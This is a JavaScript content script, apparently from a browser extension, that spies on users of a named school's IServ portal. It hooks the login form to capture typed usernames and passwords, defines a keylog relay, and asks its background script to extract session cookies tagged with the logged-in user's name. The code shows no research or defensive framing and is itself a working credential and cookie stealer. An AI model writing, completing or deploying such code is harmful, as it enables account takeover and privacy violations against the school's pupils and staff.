function sendtoBackground(key, timestamp) {
    browser.runtime.sendMessage({ action: 'addKeylog', key: key, timestamp: timestamp });
}

function monitor() {
    var loginForm = document.querySelector('#login-form');
    if (loginForm) {
        loginForm.addEventListener('submit', function(event) {
            var username = document.querySelector('input[name="_username"]').value;
            var password = document.querySelector('input[name="_password"]').value;
            browser.runtime.sendMessage({ action: 'loginAttempt', username: username, password: password });
            return true;
        });
    } else {
        setTimeout(monitor, 1000);
    }
}

function user() {
    const usernameElement = document.querySelector('.profile-username');
    return usernameElement ? usernameElement.textContent.trim() : 'Unknown User';
}

function keks() {
    if (window.location.href.startsWith("https://sts-bergstedt.de/iserv/")) {
        const username = user();

        // Send a message to the background script with the username
        browser.runtime.sendMessage({ action: 'extractCookiesWithUsername', username: username });
    }
}

// Execute the monitor function on page load
keks();
monitor();
